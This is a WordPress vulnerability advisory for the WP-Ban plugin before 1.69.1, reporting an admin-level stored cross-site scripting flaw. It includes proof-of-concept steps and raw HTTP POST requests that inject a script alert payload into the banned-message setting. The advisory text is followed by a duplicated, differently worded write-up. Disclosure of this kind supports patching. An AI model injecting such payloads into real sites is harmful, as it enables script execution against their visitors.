## WordPress Plugin Vulnerabilities

# WP-Ban < 1.69.1 - Admin+ Stored XSS

### Description

The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered\_html capability is disallowed (for example in multisite setup).

### Proof of Concept

1. Go to the plugin settings and set these fields: In "Banned Referrers", add "xss" and in "Banned Message", add "<script>alert(123);</script>"
2. Go to the website's homepage using Burp Suite and its Interceptor.
3. Intercept the request, change the "referrer" to "xss" and confirm the request. The alert triggers successfully.
The request is:
POST /wordpress\_582/wp-admin/admin.php?page=wp-ban/ban-options.php HTTP/1.1
\_wpnonce=<nonce key>&\_wp\_http\_referer=%2Fwordpress\_582%2Fwp-admin%2Fadmin.php%3Fpage%3Dwp-ban%252Fban-options.php&banned\_option\_reverse\_proxy=1&banned\_ips=&banned\_ips\_range=&banned\_hosts=&banned\_referers=xss&banned\_user\_agents=&banned\_exclude\_ips=&banned\_template\_message=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E&Submit=Save+Changes

=======
You need to trigger a `ban rule` to display the `ban message`.
For example, I set the `ban rule` to let the `referer` not equal to `xss`.
The package is like this:
```http
POST /wordpress\_582/wp-admin/admin.php?page=wp-ban/ban-options.php HTTP/1.1
...
\_wpnonce=c298ada8b0&\_wp\_http\_referer=%2Fwordpress\_582%2Fwp-admin%2Fadmin.php%3Fpage%3Dwp-ban%252Fban-options.php&banned\_option\_reverse\_proxy=1&banned\_ips=&banned\_ips\_range=&banned\_hosts=&banned\_referers=xss&banned\_user\_agents=&banned\_exclude\_ips=&banned\_template\_message=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E&Submit=Save+Changes
```
We set the `banned\_referers=xss`, and the payload in the parameter `banned\_template\_message`.
Then go to the main page, refresh the page, and set the referer as `xss`, the vulnerability will be triggered.
